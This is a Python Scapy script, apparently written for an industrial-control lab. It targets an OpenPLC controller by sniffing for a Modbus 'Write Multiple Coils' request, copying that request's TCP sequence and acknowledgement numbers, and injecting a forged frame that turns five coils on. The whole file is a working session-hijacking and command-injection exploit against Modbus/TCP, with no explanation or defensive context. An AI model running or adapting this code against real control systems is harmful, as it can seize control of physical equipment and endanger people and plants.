from scapy.all import * 
from scapy.all import *
from scapy.compat import raw
import struct 

flag = True
your_iface = "eth2"
victim_ip = "10.77.20.10"

flag = True
attempt = 1

while flag:

    print(f"\n[*] Capture attempt #{attempt}...")
    attempt += 1

    OPENPLC_FRAMES = sniff(
        iface=your_iface,
        count=4,
        timeout=10,
        lfilter=lambda p: IP in p and p[IP].dst == victim_ip
    )

    print(f"[*] Captured {len(OPENPLC_FRAMES)} packets")

    OPENPLC_WRITE_COILS_QUERY = None

    for i, pkt in enumerate(OPENPLC_FRAMES):

        print(f"    Packet {i}: ", end="")

        if Raw not in pkt:
            print("No Raw payload")
            continue

        payload = bytes(pkt[Raw].load)

        print(f"{len(payload)} bytes")

        if len(payload) < 14:
            print("        Skipping (too short for Modbus write request)")
            continue

        transaction_id = int.from_bytes(payload[0:2], "big")
        function_code = payload[7]

        print(
            f"        Transaction ID={transaction_id} "
            f"Function=0x{function_code:02X}"
        )

        if (
            payload[7] == 0x0F and
            payload[8:10] == b"\x00\x00" and
            payload[10:12] == b"\x00\x05" and
            payload[12] == 0x01
        ):
            OPENPLC_WRITE_COILS_QUERY = pkt

            print(
                "        [+] Write Multiple Coils packet matched"
            )

            flag = False
            break

    if flag:
        print("[*] Waiting for next communication cycle...")



if OPENPLC_WRITE_COILS_QUERY is None:
    raise RuntimeError("Failed to locate write coils packet")
print(OPENPLC_WRITE_COILS_QUERY[TCP].flags)
print("crafting packet")
tcpddata = {
    'src': OPENPLC_WRITE_COILS_QUERY[IP].src,
    'dst': OPENPLC_WRITE_COILS_QUERY[IP].dst,
    'sport': OPENPLC_WRITE_COILS_QUERY[TCP].sport,
    'dport': OPENPLC_WRITE_COILS_QUERY[TCP].dport,

    'seq': (
        OPENPLC_WRITE_COILS_QUERY[TCP].seq +
        len(OPENPLC_WRITE_COILS_QUERY[TCP].payload)
    ),

    'ack': OPENPLC_WRITE_COILS_QUERY[TCP].ack,
    'wnd': OPENPLC_WRITE_COILS_QUERY[TCP].window
}

TRANSACTION_ID = 13370
UNIT_ID = 1


class ModbusTCP(Packet):
    name = "ModbusTCP"

    fields_desc = [
        ShortField("transaction_id", TRANSACTION_ID),
        ShortField("protocol_id", 0),
        ShortField("length", None),
        ByteField("unit_id", UNIT_ID),
    ]

    def post_build(self, pkt, pay):
        pkt += pay

        if self.length is None:
            # Length = Unit ID + PDU
            length = len(pkt) - 6
            pkt = pkt[:4] + struct.pack("!H", length) + pkt[6:]

        return pkt


class ModbusWriteMultipleCoils(Packet):
    name = "ModbusWriteMultipleCoils"

    fields_desc = [
        ByteField("function_code", 15),
        ShortField("reference_number", 0),
        ShortField("bit_count", 5),
        ByteField("byte_count", 1),
        BitField("coil_data", 0x1F, 8),
    ]



def validate_frame(pkt):
    modbus = pkt[ModbusWriteMultipleCoils]

    expected_byte_count = (modbus.bit_count + 7) // 8

    if modbus.bit_count < 1 or modbus.bit_count > 1968:
        raise ValueError(
            f"Invalid coil count {modbus.bit_count}"
        )

    if modbus.byte_count != 1:
        raise ValueError(
            f"Byte count mismatch "
            f"(expected {expected_byte_count}, got {modbus.byte_count})"
        )

    print("[+] Modbus frame validation passed")


PAYLOAD = (
    IP(
        src=tcpddata['src'],
        dst=tcpddata['dst']
    )
    /
    TCP(
        sport=tcpddata['sport'],
        dport=tcpddata['dport'],
        flags="PA",
        window=tcpddata['wnd'],
        seq=tcpddata['seq'],
        ack=tcpddata['ack']
    )
    /
    ModbusTCP(
        transaction_id=13370,
        unit_id=1
    )
    /
    ModbusWriteMultipleCoils(
        reference_number=0,
        bit_count=5,
        coil_data=0x1F
    )
)

print("\n=== Packet Structure ===")
PAYLOAD.show2()

print("\n=== Hex Dump ===")
hexdump(PAYLOAD)

packet_bytes = raw(PAYLOAD)

print("\n=== Raw Packet Bytes ===")
print(" ".join(f"{b:02X}" for b in packet_bytes))

print(f"\nTotal Packet Size: {len(packet_bytes)} bytes")

validate_frame(PAYLOAD)

print("\n=== Modbus Payload Only ===")

modbus_bytes = raw(
    ModbusTCP(
        transaction_id=13370,
        unit_id=1
    )
    /
    ModbusWriteMultipleCoils(
        reference_number=0,
        bit_count=5,
        coil_data=0x1F
    )
)

print(" ".join(f"{b:02X}" for b in modbus_bytes))

print("\nInjecting packet...")
send(PAYLOAD, verbose=0)

print("[+] Packet injected successfully")
